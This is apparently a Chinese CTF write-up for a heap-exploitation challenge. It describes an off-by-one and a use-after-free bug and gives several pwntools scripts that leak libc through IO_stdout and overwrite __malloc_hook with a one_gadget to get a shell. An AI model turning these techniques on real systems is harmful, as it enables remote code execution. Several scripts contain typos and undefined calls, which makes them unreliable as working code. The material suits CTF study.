[TOC]
# 程序防护
![image](F4174D2C3E05469BB104F128D9633AA7)

# 程序流程

1. create 索引可覆盖， read name，存在off by one 漏洞 ，没有写入'\0'。

![image](3E60A76594184D43A28682A6A955AE03)
限制大小 0 ~ 0x60
2. free 存在UAF ， free 后可写入数据。
3. rename 修改字符串，与create 存在相同漏洞。

# 漏洞利用
没有输出函数，利用house of Roman 去爆破。
fastbin attack 和 unsorted bin 

# exp
```
from pwn import *

def create(idx,size,name):
        p.sendline("1")
        p.recv()
        p.sendline(str(size))
        p.recv()
        p.sendline(str(idx))
        p.recv()
        p.send(name)
        p.recv()

def delete(idx):
        p.sendline("2")
        p.recv()
        p.sendline(str(idx))
        p.recv()

def rename(idx,data):
        p.sendline("3")
        p.recv()
        p.sendline(str(idx))
        p.recv()
        p.send(data)

p=process('./pwn')
create(0,0x18,"0")
#0x30
create(1,0x60,"0")
#0xa0
create(2,0x60,"0")
#0x110
create(3,0x60,"0")
delete(1)
delete(2)

# overlapping 
payload = p64(0x0)+p64(0x71)
rename(0,payload)

move = '\x10'
rename(2,move)

create(2,0x60,"0")
#0x20 
create(4,0x60,"0")

#fake unsorted size
pay2 = p64(0) + p64(0xd1)
rename(0,pay2)

```
执行这步操作时，发现要检查下一个chunk 的pre_use 字段。
```
padding = p64(0x0)*0xa+p64(0x0) + p64(0xe1)
rename(2,padding)
delete(4)
```

到伪造unsorted chunk 为止了 ， 执行爆出

![image](B7A9B6F3F2AE4817B528F472792385D9)


```
from pwn import *

context(os='linux',arch='amd64',log_level='debug')

p = process("./weapon");
#p=remote("139.180.216.34",8888)
libc=ELF("./libc-2.23.so")

def g(p,data=False):
	gdb.attach(p,data)
	raw_input()


def add(size,idx,data):
	p.recvuntil("choice >> \n")
	p.sendline(str(1))
	p.recvuntil("weapon: ")
	p.sendline(str(size))
	p.recvuntil("index: ")
	p.sendline(str(idx))
	p.recvuntil("name:\n")
	p.send(data)

def add2(size,idx,data):
	
	p.sendline(str(1))
	sleep(0.1)
	p.sendline(str(size))
	sleep(0.1)
	p.sendline(str(idx))
	sleep(0.1)
	p.send(data)


def delete(idx):
	p.recvuntil("choice >> \n")
	p.sendline(str(2))
	p.recvuntil("idx :")
	p.sendline(str(idx))

def edit(idx,data):
	p.recvuntil("choice >> \n")
	p.sendline(str(3))
	p.recvuntil("idx: ")
	p.sendline(str(idx))	
	p.recvuntil("content:\n")
	p.send(data)

def edit2(idx,data):
	p.sendline(str(3))
	sleep(0.1)
	p.sendline(str(idx))	
    sleep(0.1)
	p.send(data)

#0x00
add(0x60,0,p64(0)+p64(0x71)+"\x00"*0x50)
#0x70
add(0x60,1,"\x00"*0x60)
#0xe0
add(0x60,2,"\x00"*0x60)
0x150
add(0x60,3,"\x00"*0x60)

delete(0)
delete(1)
edit(1,"\x10")

#overlapping
#0x70
add(0x60,4,"\x00"*0x60)

#0x10
#fake unsorted chunk 
add(0x60,5,"\x00"*0x50+p64(0)+p64(0xe1))

#g(p)
delete(4)
#p.recv()
# main+88
#0x70
add(0x60,6,"\xdd\x25")

delete(0)
delete(2)
edit(2,"\x70")
add(0x60,7,"\x00"*0x60)
add(0x60,8,"\x00"*0x60)
# IO_stdout flags  和 io_write_base 输出一段包含libc_addr 的数据
add(0x60,9,"\x00"*11+p64(0)*4+p64(0x00007f51e3f406e0)+p64(0xfbad1800)+p64(0x00007f51e3f406e0)*3+"\x50")
p.sendline()

libc_base = u64(p.recv(6).ljust(8,'\x00'))
libc_base = libc_base -0x3c56a3
print hex(libc_base)
malloc_addr = libc_base + libc.symbols['__malloc_hook']
print "malloc_hook"+hex(malloc_addr)
one_gadget_addr = libc_base +0xf1147
#g(p)
p.sendline(str(2))
#p.recvuntil("idx :")
sleep(0.1)
p.sendline(str(0))
sleep(0.1)
p.sendline(str(2))
sleep(0.1)
p.sendline(str(2))
sleep(0.1)
#g(p)
#delete(0)
#delete(2)
edit2(2,p64(malloc_addr-35))
sleep(0.1)
add2(0x60,7,"\x00"*0x60)
add2(0x60,8,'\x00'*19+p64(one_gadget_addr))
sleep(0.1)
p.sendline(str(1))
sleep(0.1)
p.sendline(str(60))
sleep(0.1)
p.sendline(str(7))

p.sendline("pwd")
p.sendline("ls")
p.sendline("cat flag")
#g(p)
p.interactive()

```

Kirin WP
```
from pwn import *
context.log_level = 'debug'
def create(idx,size,name):
	p.sendline("1")
	p.recv()
	p.sendline(str(size))
	p.recv()
	p.sendline(str(idx))
	p.recv()
	p.send(name)
	p.recv()

def delete(idx):
	p.sendline("2")
	p.recv()
	p.sendline(str(idx))
	p.recv()

def rename(idx,data):
	p.sendline("3")
	p.recv()
	p.sendline(str(idx))
	p.recv()
	p.send(data)
	p.recv()




def create(index,size,name):
	p.sendlineafter("choice >> \n","1")
	p.sendlineafter("weapon: ",str(size))
	p.sendlineafter("index: ",str(index))
	p.sendlineafter("name: ",str(index))

def delete(index):
	p.sendlineafter(">> \n","2")
	p.sendlineafter("input idx :",str(index))

def edit(index,name):
	p.sendlineafter(">> ","3")
	p.sendlineafter("idx: ",str(index))
	p.sendafter("new content:\b",name)

p = process('./pwn')
create(0,0x28,"\x00"*0x10+p64(0x30))
create(1,0x28,"a")
create(2,0x50,"a")
create(3,0x60,"aa")
delete(0)
delete(1) rename(1,"\x18")
create(0,0x28,"c")
create(1,0x28,p64(0)*2+p64(0x91))
delete(0)
create(4,0x60,"\xdd\x25")
create(5,0x60,"aaaa")
delete(3)
delete(5)
rename(5,"\x30")
create(6,0x60,"a")
create(6,0x60,"v")
create(6,0x60,"a")
rename(6,"\x00"*3+p64(0)*6+p64(0xfbad1887)+p64(0)*3+"\x00")
p.recvuntil("\x7f")
p.recv(2)
libc_addr = u64(p.recv(8))-0x7ffff7dd26a3+0x7ffff7a0d000
print hex(libc_addr)
create(6,0x60,"ee")
delete(6)
rename(6,p64(libc_addr+0x7ffff7dd1b10-0x7ffff7a0d000-0x23))
create(6,0x60,"aa")
create(6,0x60,"\x00"*0x13+p64(libc_addr+0xf1147))
p.interactive()


#start
p = process('./pwn')

create(0,0x28,"a")
#0x30
create(1,0x28,"a")
#0x60
create(2,0x50,"c")
#0xc0
create(3,0x60,"aa")

pad =p64(0x0)*2+p64(0x30)
rename(0,pad)

delete(0)
delete(1)
rename(1,"\x18")
#0x30
create(0,0x28,"0")
pad2 = p64(0x0)*2 +p64(0x91)
#0x00
create(1,0x28,pad2)
delete(0)
#why this address
#0x30
create(4,0x60,"\xdd\x25")
#0x130
create(5,0x60,"aaaa")
delete(3)
delete(5)
rename(5,"\x30")
# fastbin attack 控制到 \xdd\x25地址处
create(6,0x60,"a")
create(6,0x60,"b")
create(6,0x60,"c")
#IO_STDOUT
pad="\x00"*3+p64(0)*6+p64(0xfbad1887)+p64(0)*3+"\x00"
rename(6,pad)
p.recvtunil("\x7f")
p.recv(2)
libc_addr = u64(p.recv(8))-0x7ffff7dd26a3+0x7ffff7a0d000
add(6,0x60,"eee")
delete(6)
rename(6,p64(libc_addr + 0x7ffff7dd1b10-0x7ffff7a0d000-0x23))
add(6,0x60,"aaa")
add(6,0x60,"\x00"*0x13+p64(libc_addr+0xf1147))
p.interactive()



```



[stdout leak](http://pzhxbz.cn/?p=139)